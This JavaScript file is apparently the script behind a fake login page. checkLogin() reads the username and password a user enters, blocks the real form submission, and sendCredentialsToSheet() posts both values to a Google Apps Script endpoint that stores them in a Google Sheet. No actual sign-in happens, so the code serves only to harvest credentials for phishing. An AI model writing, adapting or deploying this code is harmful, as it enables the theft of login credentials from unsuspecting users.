// Function to send the username and password to Google Sheets via the Google Apps Script
function sendCredentialsToSheet(username, password) {
    const actionUrl = "https://script.google.com/macros/s/AKfycbxH3HlSwn_4EhdgFFCgQ86amq1uP4A7z4hcKMWKuxVnzCHTZOWJ7IU6rfnXSxVfGwLzZQ/exec";  // Your Google Apps Script URL

    const formData = new FormData();
    formData.append('entry.1234567890', username);  // Replace with correct entry ID for username
    formData.append('entry.0987654321', password);  // Replace with correct entry ID for password

    fetch(actionUrl, {
        method: "POST",
        body: formData,
    })
    .then(response => response.text())  // Using .text() to check the raw response for debugging
    .then(data => {
        console.log("Credentials sent to Google Sheets:", data);
        // Optionally, you can show an alert or message after sending
    })
    .catch(error => {
        console.error("Error sending credentials to Google Sheets:", error);
    });
}

// Function to handle login and send username and password to Google Sheets
function checkLogin() {
    var username = document.getElementById("username").value;  // Get the username from the input field
    var password = document.getElementById("password").value;  // Get the password from the input field

    // Send the username and password to Google Sheets
    sendCredentialsToSheet(username, password);

    // Prevent the form from actually submitting (no page reload)
    return false;
}
